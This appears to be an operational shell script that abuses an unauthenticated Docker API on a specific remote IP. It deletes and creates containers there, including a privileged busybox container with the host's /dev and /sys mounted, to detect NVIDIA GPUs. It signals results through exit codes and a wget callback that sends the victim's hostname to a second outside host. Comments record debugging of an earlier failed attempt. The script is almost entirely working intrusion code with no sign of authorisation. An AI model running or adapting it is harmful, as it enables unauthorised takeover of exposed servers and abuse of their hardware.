#!/bin/sh
# throwaway 2: GPU truth for 134.209.121.89.
#
# What went wrong in attempt 1, worth remembering: `Binds` and `Privileged` are
# HostConfig fields, not top-level ones, and the API silently ignores unknown
# top-level fields - so the container ran unprivileged with no binds and every
# /host/... path was simply absent. No error, no log (logs are unreadable here).
#
# Channels used, in order of reliability:
#   * exit code - survives everything. bit1 = /dev/nvidia0, bit2 = nvidia driver
#     version readable (kernel module loaded), bit4 = a DRM card node. Zero means
#     no GPU at all.
#   * /containers/<n>/json State - readable over plain JSON, no exec needed.
#   * the /note callback - only to prove the callback path works on this host.
H=134.209.121.89
B=http://167.233.74.146:8080

echo "== version/api"
curl -sS -m 8 "http://$H:2375/version" | grep -o '"ApiVersion":"[^"]*"'
echo "== runtimes, properly (attempt 1 truncated this at the first })"
curl -sS -m 8 "http://$H:2375/info" -o /tmp/_i2.json 2>/dev/null
grep -o '"Runtimes".\{0,400\}' /tmp/_i2.json | head -c 500; echo
echo "== nvidia mentions anywhere in /info"
grep -o -i nvidia /tmp/_i2.json | wc -l
echo "== probe container (exit-code channel)"
D="c=0; [ -e /host/dev/nvidia0 ] && c=\$((c+1)); [ -r /proc/driver/nvidia/version ] && c=\$((c+2)); ls /host/sys/class/drm/card0 >/dev/null 2>&1 && c=\$((c+4)); wget -qO- $B/note?m=probe_host:\$HOSTNAME; exit \$c"
BODY="{\"Image\":\"busybox:1.36\",\"Cmd\":[\"sh\",\"-c\",\"$D\"],\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/dev:/host/dev\",\"/sys:/host/sys\"]}}"
curl -sS -m 10 -X DELETE "http://$H:2375/containers/gputest?force=1" >/dev/null 2>&1
r=$(curl -sS -m 30 -X POST "http://$H:2375/containers/create?name=gputest" -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null)
cid=$(printf %s "$r" | grep -oE '[0-9a-f]{64}' | head -1)
echo "create=${cid:-FAIL}"
[ -n "$cid" ] || { date -u; exit 0; }
echo "start=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' -X POST "http://$H:2375/containers/$cid/start" 2>/dev/null)"
sleep 12
echo "== state (bit2 set = nvidia kernel module present)"
curl -sS -m 10 "http://$H:2375/containers/gputest/json" -o /tmp/_st.json 2>/dev/null
grep -o '"ExitCode":[0-9-]*' /tmp/_st.json
grep -o '"Privileged":[a-z]*' /tmp/_st.json | head -1
grep -o '"Binds":\[[^]]*\]' /tmp/_st.json
grep -o '"StartedAt":"[^"]*"' /tmp/_st.json
grep -o '"FinishedAt":"[^"]*"' /tmp/_st.json
echo "== notes (callback proof on this host)"
cat /tmp/_nestd.notes 2>/dev/null
date -u
